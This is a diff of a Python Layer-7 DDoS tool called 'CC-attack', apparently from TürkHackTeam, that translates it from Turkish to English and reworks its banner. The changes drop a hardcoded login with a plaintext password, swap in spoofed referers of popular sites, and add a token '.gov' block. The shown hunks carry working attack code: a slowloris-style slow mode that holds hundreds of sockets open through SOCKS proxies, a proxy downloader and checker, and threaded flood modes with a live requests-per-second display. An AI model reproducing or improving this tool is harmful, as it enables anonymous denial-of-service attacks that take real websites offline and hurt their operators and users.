@@ -1,4 +1,9 @@
 #!/usr/bin/python3
+#Coded by 'RasperPascal
+#########################################
+#         Just a little change          #
+#                        --'RasperPascal#
+#########################################
 import requests
 import socket
 import socks
@@ -9,44 +14,27 @@ import sys
 import ssl
 import datetime
 
-print("""
-
-KULLANICI GİRİŞ EKRANI
-
-""")
-
-sys_username = "admin"
-sys_password = "rCcdpzKfKJ"
-
-kullanici_adi = input("Kullanıcı Adını Giriniz: ")
-sifre = input("Şifre'yi Giriniz: ")
-
-if (kullanici_adi == sys_username) and (sifre != sys_password):
-    print("Şifre yanlış..")
-
-elif (kullanici_adi != sys_username) and (sifre == sys_password):
-    print("Kullanıcı adı yanlış..")
-
-elif (kullanici_adi != sys_username) and (sifre != sys_password):
-    print("Kullanıcı adı ve şifre yanlış..")
-else:
-    print("Giriş yapıldı!")
 
 
 print ('''
+	   /////    /////    /////////////
+	  CCCCC/   CCCCC/   | CC-attack |/
+	 CC/      CC/       |-----------|/ 
+	 CC/      CC/       |  Layer 7  |/ 
+	 CC/////  CC/////   | ddos tool |/ 
+	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Surum 3.6 (12/01/2021)
-    AloNeAqeaL PF / Maveraun.Nehr / Cakir  
-	       / RasperPascal
+Version 3.8 (2021/09/19)
+							TürkHackTeam/BasınMedya
 ┌─────────────────────────────────────────────┐
-│         Turkhackteam ddos-atak              │
+│        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
-│               Yeni Ozelikler :              │
-│          [+] Optimazyon                     │
-│          [+] Değiştirilen Çıktı             │
-│          [+] Link ayristirici               │
+│                 New stuff:                  │
+│          [+] Optimization                   │
+│          [+] Changed Output                 │
+│          [+] Added Url Parser               │
 ├─────────────────────────────────────────────┤
-│ Program Kunlandiniz Teskurler :             │
+│ Link:https://github.com/RasperPascal/-RasperPascal-Ddos-attack/ │
 └─────────────────────────────────────────────┘''')
 
 acceptall = [
@@ -67,12 +55,30 @@ acceptall = [
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
 referers = [
-	"https://www.turkhackteam.org/",
-	"https://www.turkhackteam.org/uye/rasperpascal.912368/",
-	"https://www.turkhackteam.org/uye/aloneanqel-pf.871445/",
-	"https://www.turkhackteam.org/uye/cakir.950604/",
-	"https://www.turkhackteam.org/uye/maveraun-nehr.950428/",
-  
+	"https://www.google.com/search?q=",
+	"https://check-host.net/",
+	"https://www.facebook.com/",
+	"https://www.youtube.com/",
+	"https://www.fbi.com/",
+	"https://www.bing.com/search?q=",
+	"https://r.search.yahoo.com/",
+	"https://www.cia.gov/index.html",
+	"https://vk.com/profile.php?redirect=",
+	"https://www.usatoday.com/search/results?q=",
+	"https://help.baidu.com/searchResult?keywords=",
+	"https://steamcommunity.com/market/search?q=",
+	"https://www.ted.com/search?q=",
+	"https://play.google.com/store/search?q=",
+	"https://www.qwant.com/search?q=",
+	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
+	"https://www.google.ad/search?q=",
+	"https://www.google.ae/search?q=",
+	"https://www.google.com.af/search?q=",
+	"https://www.google.com.ag/search?q=",
+	"https://www.google.com.ai/search?q=",
+	"https://www.google.al/search?q=",
+	"https://www.google.am/search?q=",
+	"https://www.google.co.ao/search?q=",
 ]
 ind_dict = {}
 data = ""
@@ -203,20 +209,20 @@ def InputOption(question,options,default):
 		if ans == "":
 			ans = default
 		elif ans not in options:
-			print("> Lütfen doğru seçeneği girin")
+			print("> Please enter the correct option")
 			ans = ""
 			continue
 	return ans
 
 def CheckerOption():
 	global proxies
-	N = str(input("> Veri Paketleri Listesine Ihtiyaciniz Varmi?(E/h,default=E):"))
-	if N == 'E' or N == "" :
+	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+	if N == 'y' or N == "" :
 		downloadsocks(choice)
 	else:
 		pass
 	if choice == "4":
-		out_file = str(input("> Socks4 Proxy dosya yolu(socks4.txt):"))
+		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
 		if out_file == '':
 			out_file = str("socks4.txt")
 		else:
@@ -224,7 +230,7 @@ def CheckerOption():
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	elif choice == "5":
-		out_file = str(input("> Socks5 Proxy dosya yolu(socks5.txt):"))
+		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
 		if out_file == '':
 			out_file = str("socks5.txt")
 		else:
@@ -232,15 +238,15 @@ def CheckerOption():
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	if len(proxies) == 0:
-		print("> Artık Proxy yok. Lütfen yeni bir tane indirin.")
+		print("> There are no more proxies. Please download a new one.")
 		sys.exit(1)
-	print (">Paket Sayisi%s Proxyler: %s" %(choice,len(proxies)))
+	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("> Veri Paketleri listesini Kontrol Etmek istermisiniz  ?(E/h, defualt=E):"))
+	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
 	if ans == "":
-		ans = "E"
-	if ans == "E":
-		ms = str(input("> Paketlerin Gecikme Suresi (Saniyeler , default=5):"))
+		ans = "y"
+	if ans == "y":
+		ms = str(input("> Delay of socks(seconds, default=5):"))
 		if ms == "":
 			ms = int(5)
 		else :
@@ -262,7 +268,7 @@ def OutputToScreen(ind_rlock):
 	while 1:
 		if i > 3:
 			i = 0
-		print("{:^70}".format("Proxyler Saldiri Durumu"))
+		print("{:^70}".format("Proxies attacking status"))
 		print("{:^70}".format("IP:PORT   <->   RPS    "))
 		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
 		ind_rlock.acquire()
@@ -285,12 +291,12 @@ def OutputToScreen(ind_rlock):
 			total = total + v
 			ind_dict[k] = 0
 		ind_rlock.release()
-		print("{:^70}".format(" ["+sp_char[i]+"] oksit-ddos-Atak | Toplam Rps:"+str(total)))
+		print("{:^70}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
 		i+=1
 		time.sleep(1)
 		print("\n"*100)
 
-def cc (event,socks_type,ind_rlock):
+def cc(event,socks_type,ind_rlock):
 	global ind_dict
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
@@ -431,23 +437,23 @@ def slow(conn,socks_type):
 			s.send(("Connection:keep-alive").encode("utf-8"))
 			
 			socket_list.append(s)
-			sys.stdout.write("[*] Yavaşlatılmış Saldırı Devrede || Bağlantılar: "+str(len(socket_list))+"\r")
+			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 		except:
 			s.close()
 			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
-			sys.stdout.write("[*] Yavaşlatılmış Saldırı Devrede || Bağlantılar: "+str(len(socket_list))+"\r")
+			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 	while True:
 		for s in list(socket_list):
 			try:
 				s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
-				sys.stdout.write("[*] Yavaşlatılmış Saldırı Devrede || Bağlantılar: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
 				s.close()
 				socket_list.remove(s)
-				sys.stdout.write("[*] Yavaşlatılmış Saldırı Devrede || Bağlantılar: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 		proxy = Choice(proxies).strip().split(":")
 		for _ in range(conn - len(socket_list)):
@@ -468,11 +474,11 @@ def slow(conn,socks_type):
 					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
 				s.send(("Connection:keep-alive").encode("utf-8"))
 				socket_list.append(s)
-				sys.stdout.write("[*] Yavaşlatılmış Saldırı Devrede || Bağlantılar: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 			except:
 				proxy = Choice(proxies).strip().split(":")
-				sys.stdout.write("[*] Yavaşlatılmış Saldırı Devrede || Bağlantılar: "+str(len(socket_list))+"\r")
+				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 				sys.stdout.flush()
 				pass
 nums = 0
@@ -531,24 +537,24 @@ def check_socks(ms):#Coded by Leeon123
 		th.join()
 		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
-	print("\r\n> Butun Proxyler Kontrol Edildi , Calisan Proxy Sayisi:"+str(len(proxies)))
-	ans = input("> Onları bir dosyaya kaydetmek ister misiniz? (E/h, default=E)")
-	if ans == "E" or ans == "":
+	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
+	ans = input("> Do u want to save them in a file? (y/n, default=y)")
+	if ans == "y" or ans == "":
 		if choice == "4":
 			with open("socks4.txt", 'wb') as fp:
 				for lines in list(proxies):
 					fp.write(bytes(lines,encoding='utf8'))
 			fp.close()
-			print("> Onlar socks4.txt adli dosyaya kayit edildi.")
+			print("> They are saved in socks4.txt.")
 		elif choice == "5":
 			with open("socks5.txt", 'wb') as fp:
 				for lines in list(proxies):
 					fp.write(bytes(lines,encoding='utf8'))
 			fp.close()
-			print("> Onlar socks5.txt adli dosyaya kayit edildi.")
+			print("> They are saved in socks5.txt.")
 			
 def check_list(socks_file):
-	print("> Liste Kontrol Ediliyor")
+	print("> Checking list")
 	temp = open(socks_file).readlines()
 	temp_list = []
 	for i in temp:
@@ -602,7 +608,7 @@ def downloadsocks(choice):
 				out_file.close()
 		except:
 			pass
-		print("> Socks4 listesini zaten socks4 olarak indirdiniz socks4.txt")
+		print("> Have already downloaded socks4 list as socks4.txt")
 	if choice == "5":
 		f = open("socks5.txt",'wb')
 		try:
@@ -631,8 +637,12 @@ def downloadsocks(choice):
 			f.close()
 		except:
 			f.close()
-		print("> Socks5 listesini zaten socks5 olarak indirdiniz socks5.txt")
-		
+		print("> Have already downloaded socks5 list as socks5.txt")
+def prevent():
+	if '.gov' in url :
+		print("> You can't attack .gov website!")
+		exit()
+	
 def main():
 	global multiple
 	global choice
@@ -641,45 +651,46 @@ def main():
 	global cookies
 	global brute
 	global url
-	print("> Saldiri Secenekleri : [cc/post/head/slow/check]")
-	mode = InputOption("> Saldiri Modunu Secin (default=cc) :",["cc","post","head","slow","check"],"cc")
-	url = str(input("> Saldiri Adres Girin:")).strip()
+	print("> Mode: [cc/post/head/slow/check]")
+	mode = InputOption("> Choose Your Mode (default=cc) :",["cc","post","head","slow","check"],"cc")
+	url = str(input("> Input the target url:")).strip()
+	prevent()
 	ParseUrl(url)
 	if mode == "post":
-		mode2 = InputOption("> Gönderi verilerini paketleri? (E/h, default=h):",["E","h","Evet","Hayir"],"h")
-		if mode2 == "E":
-			data = open(str(input("> Dosya Yolunu Girin:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
+		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
+		if mode2 == "y":
+			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = InputOption("> Çerezleri özelleştirmek istermisiniz? (E/h, default=n):",["E","h","Evet","Hayir"],"h")
-	if choice2 == "E":
-		cookies = str(input("Lütfen çerezleri giriniz:")).strip()
-	choice = InputOption("> Veri Paketi Yolunu Secin(4/5, default=5):",["4","5"],"5")
+	choice2 = InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
+	if choice2 == "y":
+		cookies = str(input("Plese input the cookies:")).strip()
+	choice = InputOption("> Choose your socks mode(4/5, default=5):",["4","5"],"5")
 	if choice == "4":
 		socks_type = 4
 	else:
 		socks_type = 5
 	if mode == "check":
 		CheckerOption()
-		print("> Sürecin sonu")
+		print("> End of process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Bağlantılar(default=400):"))
+		thread_num = str(input("> Connections(default=400):"))
 	else:
-		thread_num = str(input("> Saldiri Gucu(default=400):"))
+		thread_num = str(input("> Threads(default=400):"))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
 		try:
 			thread_num = int(thread_num)
 		except:
-			sys.exit("Cekirdek Numarasi Hatali")
+			sys.exit("Error thread number")
 	CheckerOption()
 	if len(proxies) == 0:
-		print("> Artık Proxy yok. Lütfen yeni bir tane indirin.")
+		print("> There are no more proxies. Please download a new one.")
 		return
 	ind_rlock = threading.RLock()
 	if mode == "slow":
-		input("Devam etmek için Enter tuşuna basın.")
+		input("Press Enter to continue.")
 		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
 		th.setDaemon(True)
 		th.start()
@@ -689,19 +700,19 @@ def main():
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		brute = str(input("> Hizlandirma Modunu Acin [beta](E/h, default=h):"))
+		brute = str(input("> Enable boost mode[beta](y/n, default=n):"))
 		if brute == "":
 			brute = False
-		elif brute == "E":
+		elif brute == "y":
 			brute = True
-		elif brute == "h":
+		elif brute == "n":
 			brute = False
 		event = threading.Event()
-		print("> Cekirdekler Insaat Ediliyor...")
+		print("> Building threads...")
 		SetupIndDict()
 		build_threads(mode,thread_num,event,socks_type,ind_rlock)
 		event.clear()
-		input("Devam etmek için Enter tuşuna basın.")
+		input("Press Enter to continue.")
 		event.set()
 		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
@@ -712,4 +723,4 @@ def main():
 	
 
 if __name__ == "__main__":
-	main()#Coded AloNeAqeaL PF / Maveraun.Nehr / Cakir
+	main()#Coded by 'RasperPascal
